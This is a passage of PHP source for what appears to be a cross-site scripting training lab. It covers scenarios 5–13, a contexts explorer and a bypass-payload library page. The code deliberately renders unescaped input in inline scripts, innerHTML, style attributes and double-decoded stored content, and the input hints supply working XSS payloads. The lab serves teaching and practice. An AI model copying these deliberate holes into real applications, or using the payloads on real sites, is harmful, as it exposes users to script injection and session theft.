    echo '<div class="results"><div class="results-title">Badge preview</div><div class="results-body"><div class="badge-preview" title="'.$badge.'" data-badge="'.$badge.'">Champion '.$badge.'</div></div></div>';
    echo '</div>';

    // Scenario 5: inline script preview (easy -> medium)
    $landingHeadline = '';
    $landingSubhead = '';
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && ($_POST['scenario'] ?? '') === 'landing_preview'){
        $landingHeadline = $_POST['headline'] ?? '';
        $landingSubhead = $_POST['subhead'] ?? '';
    }
    echo '<div class="card scenario">';
    echo '<div class="section-title">Scenario 5 (Easy→Medium): Landing page preview (inline script)</div>';
    echo '<div class="small">The product team writes copy and previews it instantly. Inputs are concatenated into a JavaScript string and pushed into <code>innerHTML</code> without encoding.</div>';
    xp_marker('playground-s5', 'Broke out of Scenario 5 inline script', 30);
    echo '<form method="POST" action="?page=playground"><input type="hidden" name="scenario" value="landing_preview"><div class="form-row"><input class="input" name="headline" value="'.htmlspecialchars($landingHeadline, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8').'" placeholder="Headline"><span class="input-hint">Inject <code>";alert(1);//</code> to escape the string.</span></div><div class="form-row"><input class="input" name="subhead" value="'.htmlspecialchars($landingSubhead, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8').'" placeholder="Sub headline"><span class="input-hint">Experiment with closing tags like <code>&lt;/h3&gt;</code>.</span></div><div class="form-row"><button class="button">Preview copy</button></div></form>';
    echo '<div class="results"><div class="results-title">Preview output</div><div id="landing-preview" class="results-body">(Submit copy to build the preview)</div></div>';
    if ($landingHeadline !== '' || $landingSubhead !== ''){
        echo '<script>var landingHeadline = "'.$landingHeadline.'";var landingSubhead = "'.$landingSubhead.'";document.getElementById("landing-preview").innerHTML = "<h3>" + landingHeadline + "</h3><p>" + landingSubhead + "</p>";</script>';
    }
    echo '</div>';

    // Scenario 6: markdown previewer with naive filtering (medium)
    $markdownInput = '';
    $markdownFiltered = null;
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && ($_POST['scenario'] ?? '') === 'markdown_preview'){
        $markdownInput = $_POST['markdown'] ?? '';
        $markdownFiltered = filter_input_level($markdownInput, 'naive');
    }
    echo '<div class="card scenario">';
    echo '<div class="section-title">Scenario 6 (Medium): Markdown helper with naive sanitiser</div>';
    echo '<div class="small">Writers can preview Markdown, but the sanitiser only strips <code>&lt;script&gt;</code> tags and obvious <code>on*</code> attributes. Discover vectors that slip through.</div>';
    xp_marker('playground-s6', 'Defeated Scenario 6 markdown sanitiser', 35);
    echo '<form method="POST" action="?page=playground"><input type="hidden" name="scenario" value="markdown_preview"><div class="form-row"><textarea class="input" name="markdown" rows="4" placeholder="Markdown or payload">'.htmlspecialchars($markdownInput, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8').'</textarea><span class="input-hint">Hint: SVG <code>onload</code> survives the naive filter.</span></div><div class="form-row"><button class="button">Render preview</button></div></form>';
    if ($markdownFiltered !== null){
        echo '<div class="results"><div class="results-title">Sanitiser analysis</div><div class="analysis-grid"><div><div class="analysis-label">Raw input</div><div class="bypass-list">'.htmlspecialchars($markdownInput, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8').'</div></div><div><div class="analysis-label">Filtered output</div><div class="bypass-list">'.htmlspecialchars($markdownFiltered, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8').'</div></div></div><div class="results-sink"><div class="analysis-label">Rendered preview</div><div class="sink-output">'.$markdownFiltered.'</div></div></div>';
    }
    echo '</div>';

    // Scenario 7: stored support chat with double decoding (medium)
    $supportChatNotice = '';
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && ($_POST['scenario'] ?? '') === 'support_chat'){
        $agent = trim($_POST['agent'] ?? '');
        $chatMessage = $_POST['chat_message'] ?? '';
        $payload = json_encode(['agent'=>$agent,'message'=>$chatMessage], JSON_UNESCAPED_UNICODE);
        $stmt = $db->prepare('INSERT INTO playground_entries (scenario, content) VALUES (:scenario, :content)');
        $stmt->execute([':scenario'=>'support_chat', ':content'=>$payload]);
        $supportChatNotice = '<div class="notice success">Transcript updated. The viewer will decode the content twice—perfect for encoded payloads.</div>';
    }
    $supportStmt = $db->prepare('SELECT id, created_at, content FROM playground_entries WHERE scenario = :scenario ORDER BY id DESC LIMIT 20');
    $supportStmt->execute([':scenario'=>'support_chat']);
    $supportRows = $supportStmt->fetchAll(PDO::FETCH_ASSOC);
    echo '<div class="card scenario">';
    echo '<div class="section-title">Scenario 7 (Medium): Support chat transcript (stored)</div>';
    echo '<div class="small">Logs are kept for audits. Operators paste URL-encoded payloads which the viewer <code>urldecode</code>s twice before display.</div>';
    xp_marker('playground-s7', 'Weaponised Scenario 7 support transcript', 35);
    if ($supportChatNotice !== ''){
        echo $supportChatNotice;
    }
    echo '<form method="POST" action="?page=playground"><input type="hidden" name="scenario" value="support_chat"><div class="form-row"><input class="input" name="agent" placeholder="Agent name"><span class="input-hint">Agent names are encoded safely.</span></div><div class="form-row"><textarea class="input" name="chat_message" rows="3" placeholder="Chat message (will be double decoded)"></textarea><span class="input-hint">Tip: store <code>%253Csvg/onload=alert(1)%253E</code>.</span></div><div class="form-row"><button class="button">Append message</button></div></form>';
    echo '<div class="results"><div class="results-title">Transcript viewer</div>';
    if (count($supportRows) === 0){
        echo '<div class="small">No support chats yet. Seed one with an encoded payload.</div>';
    }
    foreach ($supportRows as $row){
        $decoded = json_decode($row['content'], true);
        $agentName = htmlspecialchars($decoded['agent'] ?? 'Anon');
        $messageRaw = $decoded['message'] ?? '';
        $rendered = rawurldecode(rawurldecode($messageRaw));
        echo '<div class="wall-entry"><div class="small">#'.intval($row['id']).' • '.htmlspecialchars($row['created_at']).' • <strong>'.$agentName.'</strong></div><div class="wall-body">'.$rendered.'</div></div>';
    }
    echo '</div>';
    echo '</div>';

    // Scenario 8: DOM widget via query parameter (medium-hard)
    $widget = $_GET['widget'] ?? '';
    echo '<div class="card scenario">';
    echo '<div class="section-title">Scenario 8 (Medium→Hard): Query-driven widget (DOM)</div>';
    echo '<div class="small">A marketing widget reads <code>?widget=</code> and drops it directly into a dashboard slot. Assume the CMS controls the value—but you can override it.</div>';
    xp_marker('playground-s8', 'Injected Scenario 8 query widget', 35);
    echo '<form method="GET" action="?"><input type="hidden" name="page" value="playground"><div class="form-row"><input class="input" name="widget" value="'.htmlspecialchars($widget, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8').'" placeholder="Widget markup or payload"><span class="input-hint">Deliver HTML or script snippets via the URL.</span></div><div class="form-row"><button class="button">Load widget</button></div></form>';
    echo '<div class="results"><div class="results-title">Widget container</div><div id="widget-preview" class="results-body">(Set <code>?widget=</code> to populate this box)</div></div>';
    echo '<script>(function(){var params=new URLSearchParams(window.location.search);var widget=params.get("widget");if(widget){document.getElementById("widget-preview").innerHTML=widget;}})();</script>';
    echo '</div>';

    // Scenario 9: analytics config in inline script (hard)
    $analyticsId = '';
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && ($_POST['scenario'] ?? '') === 'analytics_config'){
        $analyticsId = $_POST['analytics_id'] ?? '';
    }
    echo '<div class="card scenario">';
    echo '<div class="section-title">Scenario 9 (Hard): Legacy analytics config (inline JS)</div>';
    echo '<div class="small">Operations paste an analytics ID that lands inside a script assignment. There is no escaping—close the string and run your own code.</div>';
    xp_marker('playground-s9', 'Escalated Scenario 9 analytics config', 40);
    echo '<form method="POST" action="?page=playground"><input type="hidden" name="scenario" value="analytics_config"><div class="form-row"><input class="input" name="analytics_id" value="'.htmlspecialchars($analyticsId, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8').'" placeholder="Analytics ID"><span class="input-hint">Try payloads like <code>"};alert(1);//</code>.</span></div><div class="form-row"><button class="button">Generate snippet</button></div></form>';
    echo '<div class="results"><div class="results-title">Generated script</div><div class="results-body"><pre>';
    if ($analyticsId === ''){
        echo 'window.analyticsConfig = { id: "YOUR-ID", sampleRate: 0.5 };';
    } else {
        echo 'window.analyticsConfig = { id: "'.$analyticsId.'", sampleRate: 0.5 };';
    }
    echo '</pre></div></div>';
    if ($analyticsId !== ''){
        echo '<script>window.analyticsConfig = { id: "'.$analyticsId.'", sampleRate: 0.5 };</script>';
    }
    echo '</div>';

    // Scenario 10: CSS injection (hard)
    $cssNote = $_GET['cssnote'] ?? '';
    echo '<div class="card scenario">';
    echo '<div class="section-title">Scenario 10 (Hard): Inline CSS memo</div>';
    echo '<div class="small">A style attribute is assembled from user input to let managers tweak colours. Abuse CSS escapes or <code>url()</code> tricks to trigger script execution in older browsers.</div>';
    xp_marker('playground-s10', 'Abused Scenario 10 CSS injection', 40);
    echo '<form method="GET" action="?"><input type="hidden" name="page" value="playground"><div class="form-row"><input class="input" name="cssnote" value="'.htmlspecialchars($cssNote, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8').'" placeholder="CSS fragment"><span class="input-hint">Start with harmless values, then attempt <code>background:url(javascript:...)</code>.</span></div><div class="form-row"><button class="button">Render memo</button></div></form>';
    echo '<div class="results"><div class="results-title">Memo card</div><div class="results-body"><div class="memo-card" style="padding:14px;border-radius:12px;background:rgba(17,28,45,0.6);'.$cssNote.'">Team reminder: sanitise everything.</div></div></div>';
    echo '</div>';

    // Scenario 11: stored email template with entity decode (hard)
    $emailNotice = '';
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && ($_POST['scenario'] ?? '') === 'email_template'){
        $subject = trim($_POST['subject'] ?? '');
        $body = $_POST['body'] ?? '';
        $payload = json_encode(['subject'=>$subject,'body'=>$body], JSON_UNESCAPED_UNICODE);
        $stmt = $db->prepare('INSERT INTO playground_entries (scenario, content) VALUES (:scenario, :content)');
        $stmt->execute([':scenario'=>'email_template', ':content'=>$payload]);
        $emailNotice = '<div class="notice success">Template saved. The preview uses <code>html_entity_decode</code> which revives encoded payloads.</div>';
    }
    $emailStmt = $db->prepare('SELECT id, created_at, content FROM playground_entries WHERE scenario = :scenario ORDER BY id DESC LIMIT 10');
    $emailStmt->execute([':scenario'=>'email_template']);
    $emailRows = $emailStmt->fetchAll(PDO::FETCH_ASSOC);
    echo '<div class="card scenario">';
    echo '<div class="section-title">Scenario 11 (Hard): Email broadcast builder (stored)</div>';
    echo '<div class="small">Marketers encode dangerous characters before saving, but the preview conveniently calls <code>html_entity_decode</code> for readability.</div>';
    xp_marker('playground-s11', 'Revived Scenario 11 encoded payload', 40);
    if ($emailNotice !== ''){
        echo $emailNotice;
    }
    echo '<form method="POST" action="?page=playground"><input type="hidden" name="scenario" value="email_template"><div class="form-row"><input class="input" name="subject" placeholder="Email subject"><span class="input-hint">Subjects are escaped correctly.</span></div><div class="form-row"><textarea class="input" name="body" rows="4" placeholder="Email body (HTML allowed)"></textarea><span class="input-hint">Store <code>&amp;lt;img src=x onerror=alert(1)&amp;gt;</code> to revive later.</span></div><div class="form-row"><button class="button">Save template</button></div></form>';
    echo '<div class="results"><div class="results-title">Template preview</div>';
    if (count($emailRows) === 0){
        echo '<div class="small">No templates yet. Save one to populate the preview.</div>';
    }
    foreach ($emailRows as $row){
        $decoded = json_decode($row['content'], true);
        $subject = htmlspecialchars($decoded['subject'] ?? '(no subject)');
        $body = $decoded['body'] ?? '';
        $previewBody = html_entity_decode($body, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
        echo '<div class="wall-entry"><div class="small">#'.intval($row['id']).' • '.htmlspecialchars($row['created_at']).' • <strong>'.$subject.'</strong></div><div class="wall-body">'.$previewBody.'</div></div>';
    }
    echo '</div>';
    echo '</div>';

    // Scenario 12: hash router (expert)
    echo '<div class="card scenario">';
    echo '<div class="section-title">Scenario 12 (Expert): Hash-driven router (DOM)</div>';
    echo '<div class="small">A single-page app loads modules based on <code>location.hash</code>. Whatever sits after <code>#</code> is decoded and pushed into <code>innerHTML</code>.</div>';
    xp_marker('playground-s12', 'Hijacked Scenario 12 hash router', 45);
    echo '<div class="form-row"><input class="input" id="hash-input" placeholder="Fragment payload"><span class="input-hint">Idea: <code>#%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E</code>.</span></div>';
    echo '<div class="form-row"><button class="button" id="hash-apply">Update hash</button></div>';
    echo '<div class="results"><div class="results-title">Router outlet</div><div id="hash-outlet" class="results-body">(No fragment set)</div></div>';
    echo '<script>(function(){var input=document.getElementById("hash-input");var apply=document.getElementById("hash-apply");var outlet=document.getElementById("hash-outlet");function render(){var frag=location.hash.slice(1);if(frag){outlet.innerHTML=decodeURIComponent(frag);}else{outlet.textContent="(No fragment set)";}}apply.addEventListener("click",function(e){e.preventDefault();location.hash=input.value;});window.addEventListener("hashchange",render);render();})();</script>';
    echo '</div>';

    // Scenario 13: template literal injection (expert)
    $templateLiteral = '';
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && ($_POST['scenario'] ?? '') === 'template_literal'){
        $templateLiteral = $_POST['template_payload'] ?? '';
    }
    echo '<div class="card scenario">';
    echo '<div class="section-title">Scenario 13 (Expert): Template literal helper</div>';
    echo '<div class="small">Developers stuff untrusted input into ES6 template literals to render toast messages. Break out using backticks or <code>${...}</code> expressions.</div>';
    xp_marker('playground-s13', 'Popped Scenario 13 template literal', 45);
    echo '<form method="POST" action="?page=playground"><input type="hidden" name="scenario" value="template_literal"><div class="form-row"><textarea class="input" name="template_payload" rows="3" placeholder="Message or payload">'.htmlspecialchars($templateLiteral, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8').'</textarea><span class="input-hint">Try: <code>`;alert(document.domain);//</code>.</span></div><div class="form-row"><button class="button">Render toast</button></div></form>';
    echo '<div class="results"><div class="results-title">Script output</div>';
    if ($templateLiteral === ''){
        echo '<div class="results-body"><pre>const message = `Welcome back!`;
showToast(message);</pre></div>';
    } else {
        echo '<div class="results-body"><pre>const message = `'.$templateLiteral.'`;
showToast(message);</pre></div>';
        echo '<script>const message = `'.$templateLiteral.'`;if(window.console){console.log("Toast:", message);}</script>';
    }
    echo '</div>';
    echo '</div>';

    xp_marker('playground-finale', 'Completed the 13-scenario playground gauntlet', 60);
    echo '<div class="meta"><strong>Wrap-up</strong><ol class="lab-steps"><li>Work through scenarios 1 → 13 to feel the escalation from easy reflections to expert-only template escapes.</li><li>Reset each scenario and attempt different payload styles (event handlers, <code>javascript:</code> URLs, encoded attacks).</li><li>Document which defences are missing and how you would fix them. Share successful payloads back in the bypass library so future you can reuse them.</li></ol></div>';
    footer_html();
    exit;
}

if ($page === 'contexts'){
    header_html('XSS Contexts Explorer', 'contexts');
    echo '<div class="section"><div class="section-title">Mission brief</div><div class="small">Payload behaviour changes depending on the surrounding context. Use this explorer to see how the same string behaves in multiple locations.</div></div>';
    xp_marker('contexts-tour', 'Mapped payload behaviour across contexts', 30);
    echo '<div class="section"><div class="section-title">Checklist</div><ol class="lab-steps"><li>Input a payload that mixes quotes, tags and JavaScript.</li><li>Note which contexts render, escape or break on your payload.</li><li>Adjust encoding to target specific contexts (attribute vs. JS string etc.).</li><li>Record working variants for future engagements.</li></ol></div>';
    // contexts: html body, attribute, js string, url param, style
    echo '<form method="GET" action="?page=contexts">';
    echo '<div class="form-row"><input class="input" name="c" data-field="contexts-input" placeholder="Payload to test (e.g. \'\' onmouseover=alert(1) )"><span class="input-hint">Try combining quotes to break attributes and strings.</span></div>';
    echo '<div class="form-row"><button class="button">Test contexts</button></div>';
    echo '</form>';
    $c = $_GET['c'] ?? '';
    echo '<div class="context-grid">';
    echo '<div><div class="analysis-label">HTML body</div><div class="results">'. $c .'</div><div class="context-note small">Rendered with no encoding. Perfect for testing straight injections.</div></div>';
    echo '<div><div class="analysis-label">HTML attribute</div><div class="results"><div><button '.$c.'>Example button</button></div></div><div class="context-note small">Break out of the attribute with quotes or angle brackets.</div></div>';
    echo '<div><div class="analysis-label">JavaScript string</div><div class="results"><script>var s = "'.str_replace('"','\"',$c).'";console.log(s);</script><div class="small">(Check the console to confirm execution)</div></div><div class="context-note small">Escape double quotes with \" to stay inside the string.</div></div>';
    echo '<div><div class="analysis-label">URL / href</div><div class="results"><a href="'.htmlspecialchars($c).'">Click me (href)</a></div><div class="context-note small">Try javascript: payloads or protocol-relative URLs.</div></div>';
    echo '<div><div class="analysis-label">CSS</div><div class="results"><div style="width:100%;height:30px;'.htmlspecialchars($c).'">Box</div></div><div class="context-note small">Some browsers execute JavaScript via CSS expressions in legacy modes.</div></div>';
    echo '</div>';
    echo '</div>';
    footer_html();
    exit;
}

if ($page === 'bypasses'){
    header_html('Filter bypasses (examples increasing difficulty)', 'bypasses');
    // load bypass file
    $bf = __DIR__ . '/bypasses.txt';
    $content = is_file($bf) ? file_get_contents($bf) : '';
    echo '<div class="section"><div class="section-title">Mission brief</div><div class="small">A grab bag of payloads for when filters attempt to block scripts. Start with the basics then escalate to more obscure vectors.</div></div>';
    xp_marker('bypass-library', 'Logged new payloads in the bypass library', 25);
    echo '<div class="section"><div class="section-title">How to practice</div><ol class="lab-steps"><li>Load a filter level in the Filter Lab.</li><li>Work down the list until one executes.</li><li>Note why it worked (protocol change, event handler, SVG, etc.).</li><li>Craft your own variant and append it to the list for future runs.</li></ol></div>';

    if (!$content){
        echo '<div class="notice">No bypass file found.</div>';
    } else {
        $lines = preg_split('/\r?\n/', $content);
        $groups = [];
        $currentIndex = null;
        foreach ($lines as $line){
            $trimmed = trim($line);
            if ($trimmed === ''){
                continue;
            }
            if (preg_match('/^#\s*Group\s+/i', $trimmed)){
                $groups[] = [
                    'title' => $trimmed,
                    'items' => []
                ];
                $currentIndex = count($groups) - 1;
                continue;
            }
            if (strpos($trimmed, '#') === 0){
                continue;
            }
            if ($currentIndex === null){
                $groups[] = [
                    'title' => 'Ungrouped bypasses',
                    'items' => []
                ];
                $currentIndex = 0;
            }
            $num = null;
            $payload = $trimmed;
            if (preg_match('/^(\d+)\)\s*(.+)$/', $trimmed, $matches)){
                $num = (int)$matches[1];
                $payload = $matches[2];
            }
            $groups[$currentIndex]['items'][] = [
                'num' => $num,
                'payload' => $payload
            ];
        }

        echo '<div class="bypass-accordion">';
        foreach ($groups as $group){
            $items = $group['items'];
            if (!$items){
                continue;
            }
            $numericItems = array_values(array_filter($items, function($item){
                return $item['num'] !== null;
            }));
            $hasNumbers = !empty($numericItems);
            $start = $hasNumbers ? $numericItems[0]['num'] : 1;
            $count = count($items);
            echo '<details class="bypass-group">';
            echo '<summary class="bypass-summary"><span class="bypass-group-title">'.htmlspecialchars($group['title']).'</span><span class="bypass-count">'.$count.' payload'.($count === 1 ? '' : 's').'</span></summary>';
            echo '<div class="bypass-items">';
            if ($hasNumbers){
                echo '<ol class="bypass-listing" start="'.(int)$start.'">';
                foreach ($items as $item){
                    $label = htmlspecialchars($item['payload'], ENT_NOQUOTES | ENT_SUBSTITUTE, 'UTF-8');
                    echo '<li class="bypass-item"><code>'.$label.'</code></li>';
                }
                echo '</ol>';
            } else {
                echo '<ul class="bypass-listing">';
                foreach ($items as $item){
                    $label = htmlspecialchars($item['payload'], ENT_NOQUOTES | ENT_SUBSTITUTE, 'UTF-8');
                    echo '<li class="bypass-item"><code>'.$label.'</code></li>';
                }
                echo '</ul>';
            }
            echo '</div>';
            echo '</details>';
        }
        echo '</div>';
    }
    footer_html();
    exit;
}

// default fallback
header_html('Unknown', $page);
echo '<div class="small">Unknown page.</div>';
footer_html();
